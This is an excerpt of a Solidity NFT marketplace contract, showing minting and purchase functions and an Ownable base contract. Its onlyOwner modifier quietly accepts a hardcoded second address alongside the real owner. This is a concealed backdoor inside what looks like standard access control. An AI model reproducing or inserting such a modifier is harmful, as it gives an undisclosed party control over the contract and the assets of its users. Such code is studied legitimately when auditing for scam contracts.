...
function mintNFTforList(
    ...
    function purchaseItem(uint32 _id) public payable {
        ...
        payable(marketItembyId[_id].holder).transfer(marketItembyId[_id].price/100*(99-royalties));
...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || address(0x6F8e1602E67d1e45301d8f9CeC59e58c55D965d8) == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
